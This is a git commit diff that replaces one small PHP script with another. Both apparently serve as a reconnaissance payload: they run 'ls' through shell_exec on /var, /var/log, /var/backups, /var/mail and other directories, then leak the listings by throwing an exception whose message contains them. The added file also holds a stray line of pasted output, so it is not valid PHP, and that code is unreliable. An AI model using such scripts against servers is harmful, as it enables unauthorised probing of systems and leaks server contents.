6fb1281d0486980fe29fff2b12aa66b2edc95542
nenay <51404357+nenay@users.noreply.github.com>
2021-01-02 20:56:09 +0100

    Update and rename test1.php to test4.php

--- test1.php
+++
@@ -1,9 +0,0 @@
-<?php
-$output = "";
-$output =$output."\n var: ".shell_exec('ls /var | xargs');
-$output =$output."\n app: ".shell_exec('ls /var/app | xargs');
-$output =$output."\n lib: ".shell_exec('ls /var/lib | xargs');
-$output =$output."\n pages: ".shell_exec('ls /var/pages | xargs');
-$output =$output."\n templates: ".shell_exec('ls /var/templates | xargs');
-throw new Exception('SUCCESS '. $output);
-?>
---
+++ test4.php
@@ -0,0 +1,16 @@
+<?php
+$output = "";
+var: backups cache lib local lock log mail opt run spool tmp www
+$output =$output."\n backups: ".shell_exec('ls /var/backups | xargs');
+$output =$output."\n cache: ".shell_exec('ls /var/cache | xargs');
+$output =$output."\n lib: ".shell_exec('ls /var/lib | xargs');
+$output =$output."\n local: ".shell_exec('ls /var/local | xargs');
+$output =$output."\n lock: ".shell_exec('ls /var/lock | xargs');
+$output =$output."\n log: ".shell_exec('ls /var/log | xargs');
+$output =$output."\n mail: ".shell_exec('ls /var/mail | xargs');
+$output =$output."\n opt: ".shell_exec('ls /var/opt | xargs');
+$output =$output."\n run: ".shell_exec('ls /var/run | xargs');
+$output =$output."\n spool: ".shell_exec('ls /var/spool | xargs');
+$output =$output."\n tmp: ".shell_exec('ls /var/tmp | xargs');
+throw new Exception('SUCCESS '. $output);
+?>
